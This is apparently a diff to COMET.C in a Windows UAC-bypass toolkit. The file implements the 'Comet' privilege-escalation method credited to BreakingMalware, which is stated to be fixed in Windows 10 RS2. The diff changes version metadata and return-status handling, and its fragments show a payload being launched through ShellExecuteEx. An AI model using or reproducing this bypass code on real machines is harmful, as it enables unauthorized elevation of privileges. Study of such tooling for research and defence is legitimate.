@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2018
+*  (C) COPYRIGHT AUTHORS, 2016 - 2019
 *
 *  TITLE:       COMET.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.17
 *
-*  DATE:        23 Nov 2018
+*  DATE:        18 Mar 2019
 *
 *  Comet method (c) BreakingMalware
 *  For description please visit original URL 
@@ -34,7 +34,7 @@
 * Fixed in Windows 10 RS2
 *
 */
-BOOL ucmCometMethod(
+NTSTATUS ucmCometMethod(
     _In_ LPWSTR lpszPayload
 )
 {
@@ -44,7 +44,13 @@ BOOL ucmCometMethod(
 
     HRESULT hr_init;
 
-    BOOL    bCond = FALSE, bResult = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
+#ifndef _WIN64
+    NTSTATUS Status;
+#endif
+
+    BOOL    bCond = FALSE;
     WCHAR   szCombinedPath[MAX_PATH * 2], szLinkFile[MAX_PATH * 3];
 
     IPersistFile    *persistFile = NULL;
@@ -54,8 +60,9 @@ BOOL ucmCometMethod(
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
-        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
-            return FALSE;
+        Status = RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue);
+        if (!NT_SUCCESS(Status))
+            return Status;
     }
 #endif
 
@@ -135,7 +142,7 @@ BOOL ucmCometMethod(
                     shinfo.nShow = SW_SHOW;
                     if (ShellExecuteEx(&shinfo)) {
                         CloseHandle(shinfo.hProcess);
-                        bResult = TRUE;
+                        MethodResult = STATUS_SUCCESS;
                     }
                 }
             }
@@ -154,5 +161,5 @@ BOOL ucmCometMethod(
 #endif
 
     supSetEnvVariable(TRUE, NULL, T_PROGRAMDATA, NULL);
-    return bResult;
+    return MethodResult;
 }
